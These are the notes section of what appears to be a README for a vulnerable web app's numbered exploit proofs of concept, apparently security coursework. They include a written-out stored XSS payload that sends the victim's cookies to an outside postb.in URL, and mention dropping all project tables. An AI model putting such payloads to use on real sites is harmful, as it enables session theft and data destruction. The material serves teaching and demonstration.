## Notes

- Due to stored XSS creating several alerts, it is advisable to use the /init endpoint between running each PoC.
- In every XSS PoC we attempted to show the vulnerability with an alert. However the vulnerabilities can be exploited in various ways, including stealing the victims' cookies.
  - Example: Instead of `<script>alert(1);</script>` the payload would be something like: `<script>window.location.href="https://postb.in/something?a="+document.cookie</script>`
- To drop all project tables in vulnerability PoCs 11 to 14 it is need to drop them in the following order: `Posts, FriendsRequests, Friends, Users`.
- We provide a folder `Resources` for the vuln8 POC with a picture example to submit.
